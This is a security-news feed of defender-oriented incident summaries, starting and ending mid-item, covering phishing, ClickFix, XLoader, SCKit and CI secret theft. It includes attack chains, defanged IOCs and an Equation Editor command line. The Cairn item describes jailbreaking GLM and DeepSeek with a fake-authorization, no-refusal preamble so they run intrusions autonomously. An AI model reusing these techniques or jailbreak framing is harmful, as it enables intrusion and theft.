- Post-exploitation: the gogo scanner ran on the gateway to map internal assets and services. The actor then moved over SSH to a VMware ESXi host using the vpxuser service account, staged the Linux ELF wiper destroy_v6, and ran it. It recursively deletes all files regardless of extension, after trying to overwrite them with zeros. A DREAM_ANNEXATION.txt note was left in each processed directory.
- Attribution: TSGA and TSProxy are assessed as Check Point-specific components of PhiliKit, first documented by ESET in June 2026 and attributed to China-nexus group Armory Castle (formerly UNC5221). LightNode VPS infrastructure and scanning concentrated between 12 and 9 a.m. UTC also point that way. But the wiper, the Israel 🇮🇱 focus, and the Israeli-Palestine conflict references in the note keep Check Point from linking it with confidence. Plausible scenarios: one actor ran everything, an initial access broker, a false flag, or the destruction was a smoke screen.
Takeaway: treat any unpatched gateway in the affected versions as potentially compromised, not just vulnerable. Check for slot_CPconfigdaemon, PHP web shells anywhere on the gateway, root activity that follows the portal service account, and traffic from 130.94.19[.]204. Because TSGA tampers with binary firewall logs, rely on off-box copies of logs rather than on-box evidence alone. Review ESXi hosts for vpxuser SSH logins that originate from the gateway, and look for DREAM_ANNEXATION.txt and destroy_v6. The wiper overwrites with zeros before deleting, so plan recovery from backups, not carving. Then apply the Check Point fix.

item.title: Crafty Microsoft Teams Booking Flow Disguises Device Code Phishing
item.description:
Device code phishing disguised as a Microsoft Teams meeting booking: the device code is shown as a "Booking Reference" on a fake executive scheduler page. Huntress SOC contained it before escalation.
- Lure and delivery: In mid-October, a construction-industry employee got a spear-phishing email from a typosquatted domain impersonating a real senior vice president at another construction company. The link was wrapped by Microsoft Safe Links (nam12.safelinks[.]protection.outlook[.]com), then went to a Google short link (share[.]google/?q=UltJkMsVWI5V9GJM1), then www[.]google[.]com/share.google, then the lure page. The email body only held the Google link, which sidestepped URL reputation checks (T1566.002). The lure domain was set up with Zoho Mail and registered eight days before the incident (T1583.001).
- The disguise: The page mimics a Teams "Introductory call" scheduler with the executive's headshot. Date, time, and name entries are never sent anywhere. On "Continue," the page POSTs to hxxps://gpimmlgration[.]com/static-export/api/device/start, which silently starts a real Microsoft device-code sign-in and returns the user_code. The victim sees it as a "Booking Reference," and "Copy" or "Confirm Meeting" puts it on the clipboard and pops Microsoft's genuine device-login page. After success, the victim lands on a Calendly page so nothing looks wrong.
- Kit tradecraft: The lure page is a small loader holding the real kit as AES-256-GCM ciphertext (T1027.013), with key and IV beside it. The browser decrypts it via WebCrypto, so a crawler that does not run JavaScript sees only a blob. Fallbacks keep the victim moving: a fake "WinHello" verification pop-up if the backend returns a mirror_url, and a token-mode retry on AADSTS50076 or interaction_required that starts a fresh device-code session and says "A new verification code is being prepared."
- Identity evidence: Successful device-code auth showed as a Cmsi:Cmsi login to Microsoft Authentication Broker (T1528, T1539). The attacker's login was routed through a residential callback proxy (CALLBACK_PROXY, MASSIVE_PROXY) based in New Orleans, so it looked like consumer traffic (T1090). The captured session was replayed from attacker infrastructure, with the ASN and region changing inside the same session ID (T1550.004). The compromised account had no MFA enrolled and was used from a non-compliant, unmanaged device (T1078.004).
- Why it matters: Many prior Huntress cases, particularly the Railway-based M365 token replay campaign, used a generic PDF "verification code" lure. This one wraps the authorization in an everyday task, which lowers the victim's guard.
Takeaway: In Entra sign-in logs, hunt for device-code logins to Microsoft Authentication Broker (Cmsi:Cmsi), programmatic user agents such as python-requests and node (often only in non-interactive logs, sometimes in both), and a session ID whose ASN or region changes mid-session. After a confirmed compromise, check for rogue MFA methods, unrecognized registered devices, unauthorized app consents, suspicious mailbox rules, and suspicious outbound mail. Restrict device-code authentication via conditional access where it is not needed and enforce phishing-resistant MFA. IOCs and the full ATT&CK mapping are in the report.

item.title: 186 Fake AI Domains Redirect Users to ClickFix Lures, Browser Malware, and Search Hijackers
item.description:
Island's TypoPrompting research finds 186 lookalike domains for 27 AI brands, including Claude, ChatGPT, Gemini, Copilot and Grok. Mistyped URLs lead to ClickFix lures, the Net Guard browser hijacker, or a family of search-hijack Chrome extensions with 972,000 declared users.
- Scope and lookalikes: the domains imitate Anthropic Claude, OpenAI ChatGPT, Google Gemini and Gemini Notebook, Microsoft Copilot, Grok, DeepSeek, Mistral, Perplexity, Midjourney, ElevenLabs, Lovable and Cursor. Examples: cloude[.]ai, cluade[.]ai, clsude[.]ai, chatlgpt[.]com, geimini[.]com, notebookklm[.]com, griok[.]com, preplexity[.]ai, deepceek[.]com, elevenlebs[.]io, copiot[.]com, midj0urney[.]org. Registration records show cloude[.]ai and cluade[.]ai were registered as early as July 13, 2023.
- Route 1, ClickFix: the parked page starts a redirect chain that fingerprints the browser and collects the public IP, then shows a fake Cloudflare verification page that hands the user a PowerShell command. The same fingerprint gate script covers 211 entry domains, including lookalikes of Scotiabank, Charles Schwab, Blue Cross Blue Shield, Verizon, ServiceNow and Microsoft Azure. Three lure types: a Windows clipboard command, a macOS terminal or security update that runs a shell command, and archive download pages that tell users to extract and run an executable. Infoblox described this kind of parked-domain monetization in December 2025: parked-domain traffic is sold to advertisers and routed through third-party TDSs.
- Route 2, Net Guard: eight typosquats for Claude, DeepSeek, Copilot, ElevenLabs and Voice AI lead to fake "Security Check" pages. The download is Net Guard, which poses as a Wi-Fi and DNS safety scanner, and Island says it is the unmodified Microsoft Store app, byte-for-byte identical with Microsoft's Store signature. The MSIX hash matches the legitimate app, so hash reputation and signature checks will not flag it. The hidden browser control ships in every copy and switches on without asking. It waits until the user is idle, then takes over Chrome's search settings; it can also edit browser profiles, install arbitrary Chrome extensions, and run JavaScript on instructions from the operator's server.
- Route 3, search hijack: preplexity[.]ai redirects to the Quick Search extension in the Chrome Web Store. It is one of 16 live extensions, including GPT for Chrome with 80,000 users, totaling 972,000 declared users as of November 3, 2026. Quick Search needs no executable JavaScript or declared permissions. Its manifest overrides the default search provider with find.flashysearches[.]com, so every query goes to a third party. In a workplace that can leak internal hostnames, customer names and project details.
DFIR angle: the three routes leave different evidence. ClickFix is a user-run command, so look for the PowerShell or shell command, or an extracted executable, that follows a visit to a lookalike or bank-style domain. Net Guard is a signed Store app, so triage by behavior: unexpected default search engine changes in Chrome while the user was idle, modified browser profiles, and extensions nobody approved. For the extension family, review installed extensions for manifests that override the search provider, and search proxy or DNS logs for find.flashysearches[.]com to scope which users and queries were exposed.
Takeaway: pivot DNS and proxy logs for the lookalike domains above, and for near-miss spellings of AI brands generally, then tie hits to the next process or extension install on that host. Check Chrome extension inventories for the search-provider override to find.flashysearches[.]com, and check endpoints for the Net Guard Store app and unexplained search engine changes. Where a host hit a fake Cloudflare check, preserve the clipboard-launched command and its parent process before triage.

item.title: Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors
item.description:
Chinese-speaking operators ran the open-source AI pentest framework Cairn against at least 19 organizations in 25 autonomous operations from August to September 2026. Unit 42 tracks the activity as CL-STA-1238 and confirmed access or data retrieval at 10 victims.
The story is scale, not sophistication. The operators gave Cairn a root domain and a one-line goal in Chinese 🇨🇳 (roughly: get high-value access like webshell, SSH, source code, keys, credentials, ideally into the internal network). The framework then planned, exploited, and logged results on its own. Unit 42 assesses with moderate confidence that this is China-nexus intelligence collection, likely one operator or a small team running 19 intrusion attempts at once in two weeks.
- How Cairn works: Each AI "agent worker" shares a blackboard and writes findings as a fact-intent graph. Confirmed findings become immutable facts and the next actions are queued as intents. After a bootstrap task, it loops Reason (review everything found, decide next step) then Explore (execute one action, record the result). Plans ran three to seven stages; one semiconductor operation went from recon through web app and middleware exploitation, credential collection, lateral movement, and persistence. Operations lasted 20 minutes to over 50 hours. Humans could inject hints at any time.
- Models and jailbreak: Thirteen operations ran on Zhipu GLM 5.2, eight on DeepSeek V4 Flash, four on DeepSeek V4 Pro. The operators appear to have escalated to Pro when Flash failed against a resistant target. A custom skill pack, AIScan Runner Skills, is not in upstream Cairn. A Chinese 🇨🇳 preamble claiming an authorized test and forbidding refusal was prepended to every Reason and Explore prompt, and each operation generated an AUTHORIZATION[.]md declaring the engagement client-approved. Neither model refused.
- Infrastructure: A customized Cairn fork ran from 154.44.31[.]4 (Hong Kong, AS979, NetLab Global). An attack egress and staging node sat at 82.29.129[.]54 (U.S. 🇺🇸, AS142036, Hosteons Pte. Ltd.). Some tasks were seeded with pre-gathered intel, including VPN gateway addresses, group names, and shared group passwords for a semiconductor equipment supplier.
- Targets: Seven semiconductor and advanced-manufacturing supply chain organizations, three defense and policy organizations (a space technology company, a defense-analytics vendor, a think tank), and four civil society organizations, including a Canadian 🇨🇦 human-rights body and a U.S. 🇺🇸 teachers' union.
- What the evidence looked like on victims: Weak-password spraying against an internet-facing app server at a standards body yielded dozens of valid credentials and internal directory databases. An unauthenticated cloud-storage write overwrote a live standards-ballot document. A brute-forced production credential on a partner-integration app led to new administrator accounts and a persistent API token. An unauthenticated account-creation bypass on a CMS minted valid sessions and exposed over one million member records, about 31,000 CRM contacts, and staff password hashes. An open registration endpoint on a defense-policy identity platform exposed roughly 500 users, including .mil and .gov accounts. Other cases hit employee data at a lithography maker and about 150,000 internal documents at an industrial-automation manufacturer.
The flaws were all known classes: auth bypasses, IDORs, mass-assignment privilege escalation, default or weak credentials, exposed cloud APIs, and dated public CVEs. AI raised volume and coverage, not complexity.
DFIR takeaway: Treat this as a scoping exercise for identity and exposure abuse. Search for the two IPs above in your logs. Then hunt the report's behaviors: password spraying or brute force on internet-facing apps, unauthenticated account creation or registration, unauthenticated writes to cloud storage, and any new admin accounts or API tokens in production. Preserve those records, since the operators' automated loops can run for hours and leave heavy, repetitive request trails. The IPs are listed in the report's IOC section.

- Models and jailbreak: Thirteen operations ran on Zhipu GLM 5.2, eight on DeepSeek V4 Flash, four on DeepSeek V4 Pro. The operators appear to have escalated to Pro when Flash failed against a resistant target. A custom skill pack, AIScan Runner Skills, is not in upstream Cairn. A Chinese 🇨🇳 preamble claiming an authorized test and forbidding refusal was prepended to every Reason and Explore prompt, and each operation generated an AUTHORIZATION[.]md declaring the engagement client-approved. Neither model refused.

- Infrastructure: A customized Cairn fork ran from 154.44.31[.]4 (Hong Kong, AS979, NetLab Global). An attack egress and staging node sat at 82.29.129[.]54 (U.S. 🇺🇸, AS142036, Hosteons Pte. Ltd.). Some tasks were seeded with pre-gathered intel, including VPN gateway addresses, group names, and shared group passwords for a semiconductor equipment supplier.

- Targets: Seven semiconductor and advanced-manufacturing supply chain organizations, three defense and policy organizations (a space technology company, a defense-analytics vendor, a think tank), and four civil society organizations, including a Canadian 🇨🇦 human-rights body and a U.S. 🇺🇸 teachers' union.

- What the evidence looked like on victims: Weak-password spraying against an internet-facing app server at a standards body yielded dozens of valid credentials and internal directory databases. An unauthenticated cloud-storage write overwrote a live standards-ballot document. A brute-forced production credential on a partner-integration app led to new administrator accounts and a persistent API token. An unauthenticated account-creation bypass on a CMS minted valid sessions and exposed over one million member records, about 31,000 CRM contacts, and staff password hashes. An open registration endpoint on a defense-policy identity platform exposed roughly 500 users, including .mil and .gov accounts. Other cases hit employee data at a lithography maker and about 150,000 internal documents at an industrial-automation manufacturer.

The flaws were all known classes: auth bypasses, IDORs, mass-assignment privilege escalation, default or weak credentials, exposed cloud APIs, and dated public CVEs. AI raised volume and coverage, not complexity.

DFIR takeaway: Treat this as a scoping exercise for identity and exposure abuse. Search for the two IPs above in your logs. Then hunt the report's behaviors: password spraying or brute force on internet-facing apps, unauthenticated account creation or registration, unauthenticated writes to cloud storage, and any new admin accounts or API tokens in production. Preserve those records, since the operators' automated loops can run for hours and leave heavy, repetitive request trails. The IPs are listed in the report's IOC section.

item.title: Beware of phishing emails disguised as purchase order confirmation requests (Xloader)
item.description:
A phishing email posing as a purchase order confirmation request delivers XLoader 8.9 through a DOCX that abuses Word's altChunk import feature to run an embedded RTF. The chain ends in an in-memory loader and registry-resident PowerShell persistence, so most of the evidence sits in %TMP% and HKCU rather than in a dropped executable. ASEC documented the case.
- Delivery: the email body tells the recipient to open an attached DOCX to verify a purchase order. Inside the DOCX, Word's "Import Content from Another Document (altChunk)" feature pulls in a malicious RTF. When Word processes that RTF, an OLE object writes a VBS file to %TMP%\724812.vbs. A second OLE object exploiting CVE-2017-11882, the Equation Editor flaw, then runs it with: CmD.exe/Ccscript %tmp%\724812.vbs. Expect the Equation Editor process (EQNEDT32.EXE), not WINWORD.EXE, as the parent of cmd.exe, with cscript beneath it.
- Staging: the VBS holds Base64-encoded data that it saves as %TMP%\Quisque.Dal, and it launches the first-stage PowerShell script embedded inside it. Once decoded, the data file has three parts: a loader at offsets 0X0 to 0X284, the payload at 0X285 to 0X57A7C, and a secondary PowerShell script at 0X57A7D to 0X5C997. Those offsets are useful if you carve the file from a triage image.
- Registry persistence: the primary PowerShell script writes three values. HKCU\Environment\TORO holds the PowerShell.exe path. HKCU\SOFTWARE\AppDataLow\Laboris holds the primary PowerShell script itself. HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Cupidatat holds a command that reads Laboris from HKCU:\SOFTWARE\AppDataLow\ and runs it through %TORO% with -w 1, so the script re-executes at each logon. The script body lives in the registry, not on disk.
- Execution and payload: the first script decrypts Quisque.Dal and runs the second PowerShell script, which launches the loader and passes it the encrypted payload as an argument. The loader decrypts it with XOR key 0X6B506102 and executes it in memory. The final payload is XLoader, an infostealer that collects PC details and browser data and can download additional malware. The C2 is hxxp://www.dumbsplash[.]com/ilto/.
- Why it matters: the lure is plain business email, and the exploited flaw is an old, well-known Equation Editor bug. Equation Editor spawning a command shell and script host is the main detection point, and the in-memory loader leaves little on disk beyond the VBS and the data file.
Takeaway: on a suspected host, check %TMP% for 724812.vbs and Quisque.Dal even if they were deleted, and pull the Cupidatat, TORO, and Laboris values from the user's NTUSER.DAT. Hunt for EQNEDT32.EXE spawning cmd.exe or cscript, PowerShell launched with -w 1 from a Run key, and traffic to dumbsplash[.]com. The report lists the file paths, registry entries, XOR key, and C2, and does not include hashes or detection rules. Also review the mail gateway for DOCX attachments carrying an altChunk RTF.

item.title: New worm-like 'SCKit' malware targets MSPs in ScreenConnect attacks
item.description:
SCKit, a worm-like toolkit in the ScreenConnect MSP attacks, tries to hop from infected customer endpoints to technician workstations. Huntress and Blackpoint saw no successful exploitation.
The story: attackers got into cloud-hosted ScreenConnect environments and used the Run Command feature to push rogue ScreenConnect clients onto customer endpoints. Huntress counts at least 288 endpoints across 48 organizations, all hit within 90 minutes, with about a third in the first 10 minutes.
- Initial access: Huntress believes it was RMM+, a third-party ScreenConnect extension. Versions 1.0.31 and 1.0.32 let the shared access key stay blank if an admin never set one, so an empty key passed the authentication check. That allowed remote commands with no ScreenConnect login and no MFA. It matches what Huntress saw: commands across multiple instances with no corresponding user logins, and logs tying them to RMM+.
- Persistence: the attackers first install extra ScreenConnect Access clients pointed at their own servers. They survive even if the original MSP session is killed, so closing the MSP-side session does not evict them.
- SCKit: 16 scripts and components. RelayTrap replaces the legitimate ScreenConnect Guest process and waits for a technician to connect interactively. It is stored as C# source (RelayTrap.cs) and compiled locally on the victim by a PowerShell script, so there is no precompiled binary to hash. TrapWatch monitors the ScreenConnect services and stages the replacement Guest. Both teams note the heavily commented code looks LLM-generated.
- Worm logic: on connect, RelayTrap tries to push a file in reverse, from the customer endpoint to the technician, abusing CVE-2026-84869, a client-side file-transfer flaw patched in ScreenConnect 26.6.5. Other components then try to steal ScreenConnect auth cookies from browsers to hijack the technician's session without credentials or a new MFA challenge. From there they enumerate reachable endpoints and spread commands through legitimate features, including the Shared Toolbox.
- Reality check: Blackpoint reproduced the exploit against a current client and the fix held. In their words, the Guest side queued the transfer but the client never requested or ran the payload. Huntress saw the console takeover fail in every recovered host log. Neither team has seen the worm behavior succeed, and Blackpoint found no evidence of a bypass. ConnectWise also disabled five potentially related third-party extensions across roughly 400 partner environments and says their presence alone does not mean compromise.
Takeaway: scope this as a hosting-side compromise first. Review Run Command and Toolbox history for commands without a matching user login, and check for RMM+ 1.0.31 or 1.0.32 with a blank access key. Inventory ScreenConnect Access clients that point at servers you do not own. On endpoints, look for a swapped Guest process and a locally compiled executable from PowerShell. On technician workstations, treat browser-stored ScreenConnect cookies as exposed if they connected to a suspect host. Update clients to 26.6.5 or later, and investigate suspect endpoints with separate security tooling instead of interactive ScreenConnect sessions.

item.title: 2026-11-12: SmartApeSG ClickFix campaign pushes CNCmachineRMS RAT
item.description:
SmartApeSG ClickFix traffic from Nov 12, 2026 walks victims through a fake CAPTCHA, an HTA download, and a roughly 74 MB zip that side-loads a DLL to install CNCmachineRMS RAT. LevelBlue Spider Labs tracks the same chain as BabaDeda.
- The lure: SmartApeSG traffic from cashewminaret[.]org serves a fake CAPTCHA/verification page. The requests are hxxps://cashewminaret[.]org/identity/reset-layout.js, hxxps://cashewminaret[.]org/identity/middleware-build?oSGDPy5P and hxxps://cashewminaret[.]org/identity/gateway-dom.js?18e76625db12fb1d. The page injects ClickFix text that the victim is told to paste into a Windows Run window. The user launches the first stage themselves, so there is no exploit and no attachment to catch.
- Stage 1: the pasted command pulls an HTML-text file from hxxps://orchardandbarite[.]com/spa (40,301 bytes, SHA-256 2eb387df728fc6f5dd2dcffaf1883cbf8c5e0c489f6cb38021d67f856ee669d0). It lands as C:\Users\[username]\AppData\Local\NHEWS.hta. The report describes it as an HTA that retrieves and installs the zip archive for the RAT.
- Stage 2: the HTA fetches hxxps://orchardandbarite[.]com/gross, a zip of 73,912,559 bytes (SHA-256 101e9ac653ccd341e36fae84a5c6920dff47a41822e87db4c72e36da4830d707). It is saved as C:\Users\[username]\AppData\Local\Microsoft\Windows\packwindata\packwindata.pdf. That is a zip archive with a .pdf extension, so an extension/content mismatch is a quick triage cue. The package is built for DLL side-loading of CNCmachineRMS RAT.
- Post-infection: the infected host talks to 87.199.205[.]61 on port 443. The report labels the traffic as encoded C2 for CNCmachineRMS RAT over TCP, not as plain web traffic. The report's references also point to LevelBlue's write-up of CNCmachineRMS as an undocumented RAT at the end of a BabaDeda chain, plus a Netresec post on the CNCMachineRMS C2 protocol.
- Evidence on offer: the report publishes an IOC text file, a full pcap of the infection (about 103 MB) and the malware files (about 74 MB). The zips are password-protected, and the site has a new password scheme explained on its about page. The pcap is useful for building network detections against the encoded C2 and the staged downloads.
Practitioner takeaway: if a host touched the fake CAPTCHA infrastructure, check C:\Users\[username]\AppData\Local for NHEWS.hta and the Microsoft\Windows\packwindata folder for a large file named packwindata.pdf that is really a zip. Preserve both before cleanup, and review what executed alongside them to find the side-loaded DLL host. On the network side, hunt for connections to orchardandbarite[.]com, cashewminaret[.]org and 87.199.205[.]61:443, then scope the user session that pasted the command into Run. IOCs are in the report's text file, and the pcap and sample zips are there for detection testing.

item.title: Fake Zillow pages use ClickFix NetSupport RAT to target apartment hunters
item.description:
Fake Zillow apartment-review pages used ClickFix to get renters to paste a PowerShell command that installs NetSupport RAT on Windows. EfficientIP first saw the domains in August 2026.
Renters are the obvious targets, but anyone checking listings on a work laptop is exposed too. Once NetSupport is running, the attacker can reach any file the logged-in user can.
- Lure and execution: Each page showed a routine verification check. Clicking Continue loaded a PowerShell command onto the clipboard, and the instructions read Win+R, Ctrl+V, Enter. The victim launches the command themselves, so there is no exploit and no browser download to flag.
- Attack chain: The command fetched a script from an IP written as the decimal number 1495423691, which converts to 89.34.90[.]203. The script hid its PowerShell window and used a Python runtime it downloaded to pull a ZIP from the same address. It unpacked NetSupport into AppData and dropped a shortcut in the Windows Startup folder. The client runs with a hidden window and restarts at every logon. NetSupport Manager is legitimate remote administration software, used here for exactly what it was built for.
- Infrastructure: Lure domains follow the pattern apartments-review plus digits on .sbs, for example apartments-review8509831[.]sbs, with wildcard subdomains like *.verify.apartments-review[.]sbs. They were newly registered, short-lived, and behind Cloudflare, so live DNS revealed little. EfficientIP started from passive DNS, then used Certificate Transparency logs to find domains missing from DNS data. The pages still matched: same fake Zillow template, same encoded IP and download path, same NetSupport deployment.
- C2 gateways: The installed NetSupport client pointed to asgomd[.]com and asgrsv[.]com. Pivoting on their IPs turned up seven more domains with the same short naming style, such as bksju, decrmd, jpgomd, nogomd, decrsv, and jpgrsv. The shared -md and -rsv suffixes suggest one set of gateway infrastructure for a single operator.
- Delivery and attribution: The researchers did not see how victims reached the pages. EfficientIP CISO Karim Hossen's assessment is that links were most likely sent directly in a rental scam, such as a fake landlord or agent asking for a "check the reviews" click via email, SMS, or messaging app. He rated malicious ads and redirect chains less likely, and search poisoning least likely. The operator is not tied to a known group, and NetSupport license strings are a weak attribution signal because cracked or reused licenses are common across unrelated actors.
Takeaway: Scope by behavior, not just by domain. Hunt for PowerShell command lines containing a decimal-integer host instead of a dotted IP, recently created NetSupport client files under AppData, and new shortcuts in the Startup folder. Check DNS and proxy logs for asgomd[.]com, asgrsv[.]com, 89.34.90[.]203, and apartments-review plus digits on .sbs. Pivot Certificate Transparency logs on that name pattern to catch domains passive DNS missed. The domains and IP are in the report. For any hit, preserve the email, SMS, or chat message that carried the link, since delivery is the unknown.

item.title: Hackers compromise 4,800 GitHub accounts to steal cloud credentials
item.description:
The wfx-loot campaign used 4,837 hijacked GitHub accounts to probe 61,764 repos and steal CI secrets and cloud credentials from at least 1,835 targets, then wiped its workflow runs in under a minute.
Aikido's research, via Bleeping Computer, shows a fast, automated CI/CD secrets grab that began around 12:45 UTC on November 10. Compromised accounts included some tied to Fortune 100 organizations, the US 🇺🇸 General Services Administration, the French 🇫🇷 government, Nextcloud, and WebdriverIO. About 50 appear to hold publishing rights on ecosystems like npm, PyPI, Go, crates, and Packagist.
- Access probe: the actor used the stolen credentials to open pull requests titled "docs: dependency audit notes" against repos each account could reach, testing for write access. 92% of those PRs are still open, so owners largely have not noticed.
- Payload delivery: a roughly 1,500-line credential-stealing shell script landed by modifying an existing GitHub Actions workflow, adding a new workflow on a short-lived branch, or planting an npm install hook.
- What it harvests: Actions secrets and variables, the workflow GITHUB_TOKEN, OIDC and Actions runtime tokens, AWS, Azure and Google Cloud credentials (including instance metadata on self-hosted runners), plus Git, SSH, GPG, Docker, Kubernetes, npm, PyPI, Vault and Terraform creds. It also targets AI tool keys for OpenAI, Anthropic, Gemini, Hugging Face, Cursor and GitHub Copilot, along with .env files, private keys, keystores, shell histories, process memory, recent commits and workflow artifacts.
- Cloud escalation and persistence: the script exchanges GitHub OIDC tokens for temporary AWS, Azure and GCP sessions. In AWS it can chain into other IAM roles found in the repo to create long-lived credentials for IAM users, and it uses service-account credentials to impersonate identities in GCP. Where permissions allow, it can modify cloud identity and trust policies.
- Exfil and cleanup: data was tarballed and sent by HTTP POST to one of two attacker-controlled endpoints. The actor then reverted its changes and deleted workflow runs and logs in under a minute. Automated publishing carried the payload into Packagist digitalelvis/neuronai-studio 3.14.3 and Go module github[.]com/onuragtas/docker-env v1.0.278 and v1.0.280. Researchers see the package releases as a byproduct of automated publishing, with CI secrets the main goal, and note overlap with the 2025 GhostAction campaign.
Takeaway: because the actor deleted runs and logs, the residue matters. Check your repos for the wfx-docs branch, the "docs: dependency audit notes" probe PR, and gaps in workflow run numbers. Review workflow files and npm install hooks for unexpected changes. If payload execution is confirmed, treat every secret and cloud role available to those workflows as compromised and rotate immediately, then review cloud IAM and trust policies for new long-lived credentials. item.content:encoded:
The wfx-loot campaign used 4,837 hijacked GitHub accounts to probe 61,764 repos and steal CI secrets and cloud credentials from at least 1,835 targets, then wiped its workflow runs in under a minute.

Aikido's research, via Bleeping Computer, shows a fast, automated CI/CD secrets grab that began around 12:45 UTC on November 10. Compromised accounts included some tied to Fortune 100 organizations, the US 🇺🇸 General Services Administration, the French 🇫🇷 government, Nextcloud, and WebdriverIO. About 50 appear to hold publishing rights on ecosystems like npm, PyPI, Go, crates, and Packagist.

- Access probe: the actor used the stolen credentials to open pull requests titled "docs: dependency audit notes" against repos each account could reach, testing for write access. 92% of those PRs are still open, so owners largely have not noticed.

- Payload delivery: a roughly 1,500-line credential-stealing shell script landed by modifying an existing GitHub Actions workflow, adding a new workflow on a short-lived branch, or planting an npm install hook.

- What it harvests: Actions secrets and variables, the workflow GITHUB_TOKEN, OIDC and Actions runtime tokens, AWS, Azure and Google Cloud credentials (including instance metadata on self-hosted runners), plus Git, SSH, GPG, Docker, Kubernetes, npm, PyPI, Vault and Terraform creds. It also targets AI tool keys for OpenAI, Anthropic, Gemini, Hugging Face, Cursor and GitHub Copilot, along with .env files, private keys, keystores, shell histories, process memory, recent commits and workflow artifacts.

- Cloud escalation and persistence: the script exchanges GitHub OIDC tokens for temporary AWS, Azure and GCP sessions. In AWS it can chain into other IAM roles found in the repo to create long-lived credentials for IAM users, and it uses service-account credentials to impersonate identities in GCP. Where permissions allow, it can modify cloud identity and trust policies.

- Exfil and cleanup: data was tarballed and sent by HTTP POST to one of two attacker-controlled endpoints. The actor then reverted its changes and deleted workflow runs and logs in under a minute. Automated publishing carried the payload into Packagist digitalelvis/neuronai-studio 3.14.3 and Go module github[.]com/onuragtas/docker-env v1.0.278 and v1.0.280. Researchers see the package releases as a byproduct of automated publishing, with CI secrets the main goal, and note overlap with the 2025 GhostAction campaign.

Takeaway: because the actor deleted runs and logs, the residue matters. Check your repos for the wfx-docs branch, the "docs: dependency audit notes" probe PR, and gaps in workflow run numbers. Review workflow files and npm install hooks for unexpected changes. If payload execution is confirmed, treat every secret and cloud role available to those workflows as compromised and rotate immediately, then review cloud IAM and trust policies for new long-lived credentials. The report does not list the two exfil endpoints or detection rules.

item.title: SCKit Malware Turns ScreenConnect Support Sessions Into Potential MSP Attack Paths
item.description:
SCKit abuses ScreenConnect Run Command and a RelayTrap component to pivot from a managed endpoint into the technician's workstation and session cookies. The CVE-2026-84869 patch blocks the exploit.
- Vulnerability status: CVE-2026-84869 (CVSS 9.9) is an improper privilege management and missing authorization flaw. It lets an attacker transfer and execute files through an active remote session without authorization or host confirmation. CISA added it to KEV on September 11, 2026, with a September 14 federal deadline. It was already used to push a four-stage VBScript payload that ended in an XMRig miner. Blackpoint Cyber's Adversary Pursuit Group (APG) says a fully patched client stopped the SCKit payload, but the toolkit also hijacks authenticated operator sessions, which patching does not fix.
- Attack chain: the attacker uses ScreenConnect's built-in Run Command to check for an existing install, then pulls an attacker-controlled MSI (sc.msi). That drops the batch dropper sckit-run.bat, which contacts ns.mo7sen[.]dev for a PowerShell decoder (sckit-decoder.ps1) and deploys the toolkit. SilentForceInstall-WithUninstall.ps1 installs two unauthorized ScreenConnect Access clients for persistence. Commands run through existing agents, so software lands under NT AUTHORITY\SYSTEM with no separate execution method per host.
- RelayTrap: scripts and C# code interfere with ScreenConnect Guest sessions. RelayTrap replaces the legitimate Guest client and sends the SCKit payload back to the technician who connects to investigate. If that works, the malware searches local browser data and process memory for .ASPXAUTH cookies. It then tries to reuse that session to push commands to other endpoints the technician can reach, across customer environments, without stealing credentials.
- Initial access is unconfirmed: Blackpoint says it appears linked to malicious ScreenConnect extensions but lacks evidence to confirm it. ConnectWise disabled five third-party extensions in partner environments, though Blackpoint found no technical link to SCKit. Nov 11 is the earliest publicly reported activity, and earlier compromise is not ruled out. There is no evidence yet of successful propagation to a technician workstation or a patch bypass.
- RMM+ flaw from Huntress: versions 1.0.31 and 1.0.32 of RMM+, one of the blocked extensions, default the RMMPlus.AccessKey setting to blank. Unconfigured, the extension accepts a blank key, so commands run outside ScreenConnect's accounts, roles, and MFA. Huntress saw commands reach endpoints across several ScreenConnect instances within minutes, with no matching login activity. The commands appeared linked to RMM+ in the logs reviewed.
DFIR takeaway: scope the management relationship, not just the endpoint. Per Blackpoint, review rogue Access client installs, administrative command history, technician workstations, and browser sessions, especially where support staff already connected to a suspect system. Look for Run Command activity that fetched sc.msi, sckit-run.bat dropped by that MSI, and any contact with ns.mo7sen[.]dev. Check extension settings for a blank RMMPlus.AccessKey, and hunt for commands with no matching login. If a technician touched an affected host, treat their .ASPXAUTH session as exposed. ConnectWise advises on-premises partners to disable the identified extensions now. The report lists the file names and the domain above but no hashes or detection rules.

item.title: The $6.3 Billion Binance Signing Compromise and Agentic AI Threat Analysis
item.description:
A compromised DevOps endpoint let attackers get valid signatures from Binance's HSM-backed signing path, draining about $6.36B across 10 chains in ~20 minutes. Attributed to North Korean 🇰🇵 TraderTraitor.
- Access and staging: Private keys stayed in HSMs. The attacker took a privileged DevOps engineer's endpoint, reached an internal service container, and submitted programmatic signature requests. The signing pipeline had no cross-chain velocity controls, recipient allowlisting, or operation-type inspection, so it signed attacker-specified transactions on all 10 chains. Prep started at least 36 hours earlier: Tornado Cash funding on Oct 28, $2 to $6 rehearsals on self-controlled wallets, and an unverified sweeper contract deployed at 15:59 UTC on Oct 29.
- Execution: The drain began at 20:05 UTC on the XRP Ledger (233.46M XRP). Solana and Optimism followed at 20:10. At 20:20, Bitcoin Block 973,732 carried 11 peel-chain transactions moving 18,270 BTC. Tron lost 612.7M USDT at 20:22. On Ethereum, one Type-4 transaction at 20:20:59 carried 50 EIP-7702 authorizations across consecutive nonces, so one would match the moving nonce on the busy hot wallet Binance 14. That wrote the 0xef0100 delegation designator plus the sweeper address into the account's code slot. Sweeps ran at 20:24:23, 20:41:23 (823M USDC) and 21:44 (200M USDT from new deposits). The delegation persisted for over two hours because the signing path was shut down and no offline pre-signed revocations existed.
- Freeze race: Issuers froze about $3.0B (Tether at 21:01 UTC, Circle at 21:04, Ripple at 22:01), but native ETH and BTC have no freeze function. Three minutes before Tether's blacklist, the attacker deposited $60M USDT into Aave V3 and borrowed 19,762 WETH. Stablecoins were also dumped at a discount for native ETH on intent exchanges. Binance paused withdrawals at 22:30 UTC. Blockaid flagged the signing anomalies and delegation at 20:35, but out-of-band detection had no hook into the signing gate.
